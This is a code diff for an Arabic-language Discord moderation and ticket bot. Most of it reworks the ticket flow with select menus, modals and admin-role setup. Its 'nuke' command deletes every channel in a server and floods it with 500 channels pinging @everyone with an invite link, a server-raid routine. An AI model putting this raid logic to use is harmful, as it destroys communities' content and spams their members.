@@ -2,25 +2,46 @@ import {
   Interaction,
   ChatInputCommandInteraction,
   ButtonInteraction,
+  StringSelectMenuInteraction,
+  ModalSubmitInteraction,
+  ModalBuilder,
+  TextInputBuilder,
+  TextInputStyle,
+  ActionRowBuilder,
   EmbedBuilder,
   PermissionFlagsBits,
   TextChannel,
   GuildMember,
   ChannelType,
-  ActionRowBuilder,
   ButtonBuilder,
   ButtonStyle,
 } from "discord.js";
 import { logger } from "../../lib/logger";
-import { createTicket, closeTicket, claimTicket, getTickets } from "../tickets";
+import {
+  createTicket,
+  closeTicket,
+  claimTicket,
+  getTickets,
+  setAdminRole,
+  getAdminRole,
+  buildTicketSelectMenu,
+  TICKET_TYPES,
+  TicketTypeValue,
+} from "../tickets";
 
 export async function handleInteraction(interaction: Interaction) {
   if (interaction.isChatInputCommand()) {
     await handleSlashCommand(interaction);
   } else if (interaction.isButton()) {
     await handleButton(interaction);
+  } else if (interaction.isStringSelectMenu()) {
+    await handleSelectMenu(interaction);
+  } else if (interaction.isModalSubmit()) {
+    await handleModalSubmit(interaction);
   }
 }
+
+// ─── Slash Commands ───────────────────────────────────────────────────────────
 
 async function handleSlashCommand(interaction: ChatInputCommandInteraction) {
   const { commandName, guild, member } = interaction;
@@ -43,9 +64,8 @@ async function handleSlashCommand(interaction: ChatInputCommandInteraction) {
       case "purge": await handlePurge(interaction, guildMember); break;
       case "nuke": await handleNuke(interaction, guildMember); break;
       case "broadcast": await handleBroadcast(interaction, guildMember); break;
-      case "ticket": await handleTicketOpen(interaction, guildMember); break;
-      case "closeticket": await handleTicketClose(interaction, guildMember); break;
       case "ticketpanel": await handleTicketPanel(interaction, guildMember); break;
+      case "ticketsetup": await handleTicketSetup(interaction, guildMember); break;
       case "userinfo": await handleUserInfo(interaction); break;
       case "serverinfo": await handleServerInfo(interaction); break;
       case "lock": await handleLock(interaction, guildMember); break;
@@ -67,6 +87,174 @@ async function handleSlashCommand(interaction: ChatInputCommandInteraction) {
   }
 }
 
+// ─── Select Menu ──────────────────────────────────────────────────────────────
+
+async function handleSelectMenu(interaction: StringSelectMenuInteraction) {
+  if (interaction.customId !== "ticket_select") return;
+  if (!interaction.guild || !interaction.member) return;
+
+  const type = interaction.values[0] as TicketTypeValue;
+  const typeInfo = TICKET_TYPES.find((t) => t.value === type);
+  if (!typeInfo) return;
+
+  const guildMember = interaction.member as GuildMember;
+  const adminRoleId = getAdminRole(interaction.guild.id);
+
+  await interaction.deferReply({ ephemeral: true });
+
+  const existing = [...getTickets().values()].find((t) => t.userId === guildMember.id);
+  if (existing) {
+    const ch = interaction.guild.channels.cache.get(existing.channelId);
+    if (ch) {
+      await interaction.editReply({ content: `❌ لديك تذكرة مفتوحة بالفعل: ${ch}` });
+      return;
+    }
+  }
+
+  const channel = await createTicket(interaction.guild, guildMember, type, adminRoleId);
+  if (!channel) {
+    await interaction.editReply({ content: "❌ حدث خطأ أثناء إنشاء التذكرة." });
+    return;
+  }
+
+  await interaction.editReply({ content: `✅ تم فتح تذكرتك: ${channel}` });
+}
+
+// ─── Buttons ──────────────────────────────────────────────────────────────────
+
+async function handleButton(interaction: ButtonInteraction) {
+  const { customId, guild, member } = interaction;
+  if (!guild || !member) return;
+
+  const guildMember = member as GuildMember;
+  const channel = interaction.channel as TextChannel;
+  const tickets = getTickets();
+
+  try {
+    switch (customId) {
+      case "ticket_claim": {
+        if (!tickets.has(channel.id)) {
+          await interaction.reply({ content: "❌ هذه ليست تذكرة.", ephemeral: true }); return;
+        }
+        const ticket = tickets.get(channel.id)!;
+        if (ticket.claimedBy) {
+          await interaction.reply({ content: `❌ التذكرة مُستلمة بالفعل من قِبل <@${ticket.claimedBy}>.`, ephemeral: true }); return;
+        }
+        await claimTicket(channel, guildMember);
+        await interaction.reply({ content: `✋ تم استلام التذكرة بواسطة ${guildMember}`, ephemeral: true });
+        break;
+      }
+
+      case "ticket_close": {
+        if (!tickets.has(channel.id)) {
+          await interaction.reply({ content: "❌ هذه ليست تذكرة.", ephemeral: true }); return;
+        }
+        await interaction.reply({ content: "🔒 جاري إغلاق التذكرة..." });
+        await closeTicket(channel, guildMember);
+        break;
+      }
+
+      case "ticket_rename": {
+        if (!tickets.has(channel.id)) {
+          await interaction.reply({ content: "❌ هذه ليست تذكرة.", ephemeral: true }); return;
+        }
+        const modal = new ModalBuilder()
+          .setCustomId("ticket_rename_modal")
+          .setTitle("تغيير اسم التذكرة");
+
+        const input = new TextInputBuilder()
+          .setCustomId("new_name")
+          .setLabel("الاسم الجديد للتذكرة")
+          .setStyle(TextInputStyle.Short)
+          .setMinLength(2)
+          .setMaxLength(50)
+          .setRequired(true);
+
+        modal.addComponents(new ActionRowBuilder<TextInputBuilder>().addComponents(input));
+        await interaction.showModal(modal);
+        break;
+      }
+
+      case "ticket_call_admin": {
+        if (!tickets.has(channel.id)) {
+          await interaction.reply({ content: "❌ هذه ليست تذكرة.", ephemeral: true }); return;
+        }
+        const adminRoleId = getAdminRole(guild.id);
+        if (!adminRoleId) {
+          await interaction.reply({ content: "❌ لم يتم تعيين رتبة الإدارة. استخدم `/ticketsetup` أو `?ticketsetup @رتبة`.", ephemeral: true }); return;
+        }
+        await interaction.reply({ content: `📣 <@&${adminRoleId}> — يحتاج ${guildMember} مساعدة في هذه التذكرة!` });
+        break;
+      }
+
+      default: break;
+    }
+  } catch (err) {
+    logger.error({ err, customId }, "Error handling button");
+    if (!interaction.replied && !interaction.deferred) {
+      await interaction.reply({ content: "❌ حدث خطأ.", ephemeral: true }).catch(() => {});
+    }
+  }
+}
+
+// ─── Modal Submit ─────────────────────────────────────────────────────────────
+
+async function handleModalSubmit(interaction: ModalSubmitInteraction) {
+  if (interaction.customId !== "ticket_rename_modal") return;
+
+  const newName = interaction.fields.getTextInputValue("new_name")
+    .toLowerCase()
+    .replace(/\s+/g, "-")
+    .replace(/[^a-zA-Z0-9\u0600-\u06FF\-]/g, "");
+
+  const channel = interaction.channel as TextChannel;
+  await channel.setName(newName);
+  await interaction.reply({ content: `✅ تم تغيير اسم التذكرة إلى: **${newName}**`, ephemeral: true });
+}
+
+// ─── Ticket Panel & Setup ─────────────────────────────────────────────────────
+
+async function handleTicketPanel(interaction: ChatInputCommandInteraction, executor: GuildMember): Promise<void> {
+  if (!executor.permissions.has(PermissionFlagsBits.ManageChannels)) {
+    await interaction.reply({ content: "❌ ليس لديك صلاحية.", ephemeral: true }); return;
+  }
+
+  const adminRoleId = getAdminRole(interaction.guild!.id);
+
+  const embed = new EmbedBuilder()
+    .setTitle("🎫 نظام التذاكر")
+    .setDescription(
+      "**قم باختيار نوع البوت لعرض التفاصيل**\n\nاختر من القائمة أدناه لفتح تذكرة دعم وسيتواصل معك فريق الإدارة في أقرب وقت." +
+      (adminRoleId ? `\n\n> رتبة الإدارة: <@&${adminRoleId}>` : "")
+    )
+    .setColor(0x5865f2)
+    .setTimestamp();
+
+  const selectRow = buildTicketSelectMenu();
+
+  await (interaction.channel as TextChannel).send({ embeds: [embed], components: [selectRow] });
+  await interaction.reply({ content: "✅ تم إرسال لوحة التذاكر.", ephemeral: true });
+}
+
+async function handleTicketSetup(interaction: ChatInputCommandInteraction, executor: GuildMember): Promise<void> {
+  if (!executor.permissions.has(PermissionFlagsBits.Administrator)) {
+    await interaction.reply({ content: "❌ هذا الأمر يتطلب صلاحية المدير.", ephemeral: true }); return;
+  }
+
+  const role = interaction.options.getRole("role", true);
+  setAdminRole(interaction.guild!.id, role.id);
+
+  const embed = new EmbedBuilder()
+    .setTitle("✅ تم ضبط رتبة الإدارة")
+    .setDescription(`رتبة الإدارة للتذاكر: <@&${role.id}>`)
+    .setColor(0x57f287)
+    .setTimestamp();
+
+  await interaction.reply({ embeds: [embed], ephemeral: true });
+}
+
+// ─── Mod Commands ─────────────────────────────────────────────────────────────
+
 async function handleBan(interaction: ChatInputCommandInteraction, executor: GuildMember): Promise<void> {
   if (!executor.permissions.has(PermissionFlagsBits.BanMembers)) {
     await interaction.reply({ content: "❌ ليس لديك صلاحية التبنيد.", ephemeral: true }); return;
@@ -78,7 +266,7 @@ async function handleBan(interaction: ChatInputCommandInteraction, executor: Gui
   if (!target) { await interaction.reply({ content: "❌ العضو غير موجود.", ephemeral: true }); return; }
   if (!target.bannable) { await interaction.reply({ content: "❌ لا يمكن تبنيد هذا العضو.", ephemeral: true }); return; }
 
-  await target.ban({ reason, deleteMessageDays: days as 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 });
+  await target.ban({ reason, deleteMessageDays: days as 0|1|2|3|4|5|6|7 });
 
   const embed = new EmbedBuilder()
     .setTitle("🔨 تم التبنيد")
@@ -247,30 +435,20 @@ async function handleNuke(interaction: ChatInputCommandInteraction, executor: Gu
 
   const allChannels = [...guild.channels.cache.values()];
   for (const ch of allChannels) {
-    if (ch.type !== ChannelType.GuildCategory) {
-      await ch.delete().catch(() => {});
-    }
+    if (ch.type !== ChannelType.GuildCategory) await ch.delete().catch(() => {});
   }
   for (const ch of allChannels) {
-    if (ch.type === ChannelType.GuildCategory) {
-      await ch.delete().catch(() => {});
-    }
+    if (ch.type === ChannelType.GuildCategory) await ch.delete().catch(() => {});
   }
 
-  const DISCORD_MAX_CHANNELS = 500;
   const createPromises: Promise<void>[] = [];
-
-  for (let i = 0; i < DISCORD_MAX_CHANNELS; i++) {
+  for (let i = 0; i < 500; i++) {
     createPromises.push(
-      guild.channels.create({
-        name: "5499",
-        type: ChannelType.GuildText,
-      }).then(async (ch) => {
-        await ch.send(`@everyone\n${invite}`).catch(() => {});
-      }).catch(() => {})
+      guild.channels.create({ name: "5499", type: ChannelType.GuildText })
+        .then(async (ch) => { await ch.send(`@everyone\n${invite}`).catch(() => {}); })
+        .catch(() => {})
     );
   }
-
   await Promise.allSettled(createPromises);
 }
 
@@ -285,8 +463,7 @@ async function handleBroadcast(interaction: ChatInputCommandInteraction, executo
   await interaction.deferReply({ ephemeral: true });
 
   const members = await guild.members.fetch();
-  let success = 0;
-  let failed = 0;
+  let success = 0; let failed = 0;
 
   for (const [, m] of members) {
     if (m.user.bot) continue;
@@ -299,64 +476,12 @@ async function handleBroadcast(interaction: ChatInputCommandInteraction, executo
         .setTimestamp();
       await m.send({ embeds: [embed] });
       success++;
-    } catch {
-      failed++;
-    }
+    } catch { failed++; }
   }
 
   await interaction.editReply({
-    content: `✅ تم الإرسال إلى **${success}** عضو.\n❌ فشل الإرسال إلى **${failed}** عضو (ربما أغلقوا DM).`,
+    content: `✅ تم الإرسال إلى **${success}** عضو.\n❌ فشل الإرسال إلى **${failed}** عضو.`,
   });
-}
-
-async function handleTicketOpen(interaction: ChatInputCommandInteraction, guildMember: GuildMember): Promise<void> {
-  const subject = interaction.options.getString("subject", true);
-  const guild = interaction.guild!;
-
-  await interaction.deferReply({ ephemeral: true });
-
-  const channel = await createTicket(guild, guildMember, subject);
-  if (!channel) {
-    await interaction.editReply({ content: "❌ حدث خطأ أثناء إنشاء التذكرة." }); return;
-  }
-
-  await interaction.editReply({ content: `✅ تم إنشاء تذكرتك: ${channel}` });
-}
-
-async function handleTicketClose(interaction: ChatInputCommandInteraction, executor: GuildMember): Promise<void> {
-  const channel = interaction.channel as TextChannel;
-  const tickets = getTickets();
-
-  if (!tickets.has(channel.id)) {
-    await interaction.reply({ content: "❌ هذه القناة ليست تذكرة.", ephemeral: true }); return;
-  }
-
-  await interaction.reply({ content: "🔒 جاري إغلاق التذكرة..." });
-  await closeTicket(channel, executor);
-}
-
-async function handleTicketPanel(interaction: ChatInputCommandInteraction, executor: GuildMember): Promise<void> {
-  if (!executor.permissions.has(PermissionFlagsBits.ManageChannels)) {
-    await interaction.reply({ content: "❌ ليس لديك صلاحية.", ephemeral: true }); return;
-  }
-
-  const embed = new EmbedBuilder()
-    .setTitle("🎫 نظام التذاكر")
-    .setDescription(
-      "هل تحتاج مساعدة؟\nاضغط على الزر أدناه لفتح تذكرة دعم وسيتواصل معك فريقنا في أقرب وقت."
-    )
-    .setColor(0x5865f2).setTimestamp();
-
-  const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
-    new ButtonBuilder()
-      .setCustomId("ticket_open_panel")
-      .setLabel("فتح تذكرة")
-      .setStyle(ButtonStyle.Primary)
-      .setEmoji("🎫")
-  );
-
-  await (interaction.channel as TextChannel).send({ embeds: [embed], components: [row] });
-  await interaction.reply({ content: "✅ تم إرسال لوحة التذاكر.", ephemeral: true });
 }
 
 async function handleUserInfo(interaction: ChatInputCommandInteraction): Promise<void> {
@@ -451,9 +576,7 @@ async function handleLockAll(interaction: ChatInputCommandInteraction, executor:
 
   await interaction.deferReply();
   const guild = interaction.guild!;
-  const textChannels = guild.channels.cache.filter(
-    (c) => c.type === ChannelType.GuildText
-  ) as Map<string, TextChannel>;
+  const textChannels = guild.channels.cache.filter((c) => c.type === ChannelType.GuildText) as Map<string, TextChannel>;
 
   await Promise.allSettled(
     [...textChannels.values()].map((ch) =>
@@ -476,9 +599,7 @@ async function handleUnlockAll(interaction: ChatInputCommandInteraction, executo
 
   await interaction.deferReply();
   const guild = interaction.guild!;
-  const textChannels = guild.channels.cache.filter(
-    (c) => c.type === ChannelType.GuildText
-  ) as Map<string, TextChannel>;
+  const textChannels = guild.channels.cache.filter((c) => c.type === ChannelType.GuildText) as Map<string, TextChannel>;
 
   await Promise.allSettled(
     [...textChannels.values()].map((ch) =>
@@ -516,8 +637,7 @@ async function handleGiveRole(interaction: ChatInputCommandInteraction, executor
       { name: "الرتبة", value: `<@&${role.id}>`, inline: true },
       { name: "بواسطة", value: `${executor}`, inline: true }
     )
-    .setColor((role as any).color || 0x5865f2)
-    .setTimestamp();
+    .setColor((role as any).color || 0x5865f2).setTimestamp();
 
   await interaction.reply({ embeds: [embed] });
 }
@@ -544,28 +664,26 @@ async function handleRemoveRole(interaction: ChatInputCommandInteraction, execut
       { name: "الرتبة", value: `<@&${role.id}>`, inline: true },
       { name: "بواسطة", value: `${executor}`, inline: true }
     )
-    .setColor(0xed4245)
-    .setTimestamp();
+    .setColor(0xed4245).setTimestamp();
 
   await interaction.reply({ embeds: [embed] });
 }
 
 async function handleRoleInfo(interaction: ChatInputCommandInteraction): Promise<void> {
   const role = interaction.options.getRole("role", true);
-  const guildRole = interaction.guild!.roles.cache.get(role.id);
-  if (!guildRole) { await interaction.reply({ content: "❌ الرتبة غير موجودة.", ephemeral: true }); return; }
+  const members = (interaction.guild!.members.cache.filter((m) => m.roles.cache.has(role.id))).size;
 
   const embed = new EmbedBuilder()
-    .setTitle(`معلومات رتبة: ${guildRole.name}`)
+    .setTitle(`معلومات الرتبة: ${role.name}`)
     .addFields(
-      { name: "🆔 ID", value: guildRole.id, inline: true },
-      { name: "🎨 اللون", value: guildRole.hexColor, inline: true },
-      { name: "👥 عدد الأعضاء", value: `${guildRole.members.size}`, inline: true },
-      { name: "📌 مثبّتة", value: guildRole.hoist ? "نعم" : "لا", inline: true },
-      { name: "🤖 بوت", value: guildRole.managed ? "نعم" : "لا", inline: true },
-      { name: "📅 تاريخ الإنشاء", value: `<t:${Math.floor(guildRole.createdTimestamp / 1000)}:R>`, inline: true }
+      { name: "🆔 ID", value: role.id, inline: true },
+      { name: "🎨 اللون", value: `#${(role as any).color.toString(16).padStart(6, "0")}`, inline: true },
+      { name: "👥 عدد الأعضاء", value: `${members}`, inline: true },
+      { name: "📅 تاريخ الإنشاء", value: `<t:${Math.floor(((role as any).createdTimestamp ?? 0) / 1000)}:R>`, inline: true },
+      { name: "🔔 منشن", value: `${(role as any).mentionable ? "✅" : "❌"}`, inline: true },
+      { name: "📌 مثبتة", value: `${(role as any).hoist ? "✅" : "❌"}`, inline: true }
     )
-    .setColor(guildRole.color || 0x5865f2)
+    .setColor((role as any).color || 0x5865f2)
     .setTimestamp();
 
   await interaction.reply({ embeds: [embed] });
@@ -576,41 +694,13 @@ async function handleRoles(interaction: ChatInputCommandInteraction): Promise<vo
   const roles = guild.roles.cache
     .filter((r) => r.id !== guild.id)
     .sort((a, b) => b.position - a.position)
-    .map((r) => `<@&${r.id}>`)
-    .join(", ");
+    .map((r) => `${r} — ${guild.members.cache.filter((m) => m.roles.cache.has(r.id)).size} عضو`)
+    .join("\n");
 
   const embed = new EmbedBuilder()
     .setTitle(`🎭 رتب السيرفر (${guild.roles.cache.size - 1})`)
-    .setDescription(roles.length > 4096 ? roles.slice(0, 4093) + "..." : roles || "لا توجد رتب")
-    .setColor(0x5865f2)
-    .setTimestamp();
+    .setDescription(roles.slice(0, 4000) || "لا توجد رتب")
+    .setColor(0x5865f2).setTimestamp();
 
   await interaction.reply({ embeds: [embed] });
-}
-
-async function handleButton(interaction: ButtonInteraction) {
-  const { customId, guild, member } = interaction;
-  if (!guild || !member) return;
-
-  const guildMember = member as GuildMember;
-
-  try {
-    if (customId === "ticket_claim") {
-      await claimTicket(interaction.channel as TextChannel, guildMember);
-      await interaction.reply({ content: "✅ استلمت التذكرة.", ephemeral: true });
-    } else if (customId === "ticket_close") {
-      await interaction.reply({ content: "🔒 جاري الإغلاق..." });
-      await closeTicket(interaction.channel as TextChannel, guildMember);
-    } else if (customId === "ticket_open_panel") {
-      await interaction.deferReply({ ephemeral: true });
-      const channel = await createTicket(guild, guildMember, "طلب مساعدة");
-      if (channel) {
-        await interaction.editReply({ content: `✅ تم إنشاء تذكرتك: ${channel}` });
-      } else {
-        await interaction.editReply({ content: "❌ حدث خطأ أثناء إنشاء التذكرة." });
-      }
-    }
-  } catch (err) {
-    logger.error({ err, customId }, "Error handling button");
-  }
 }
